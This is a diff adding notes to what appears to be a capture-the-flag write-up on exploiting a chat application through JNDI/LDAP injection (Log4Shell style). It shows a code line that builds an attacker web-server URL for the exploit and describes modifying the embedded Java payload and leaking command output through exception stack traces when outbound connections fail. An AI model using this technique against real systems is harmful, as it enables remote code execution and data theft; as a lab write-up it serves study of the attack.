@@ -104,3 +104,11 @@ So we can change that yo our Web server url (the one running 8000 on local host.
  
  ​   ` ​url​ ​=​ ​"http://{}/#Exploit"​.​format​(​"<WEB SERVER URL HERE>")`
 
+Upon further inspection,  we also realise that the Java exploit program is enclosed in multiline quotes `"""` as `program`
+We can modify this to our liking. 
+
+When we type in the JNDI/LDAP uri into the chat app, we get an exception. (Don't have it now, will post later, watch repo for update)
+I have tested with Java code uploading HTTP GET and POST requests using the Java Standard Library, and it turns out we cannot connect to the Internet from Java (the machine is buggy? 🤔)
+However, a very detailed stack trace is printed. We can throw an exception to get output from commands.
+
+Will post the rest soon. Watch repo for updates.
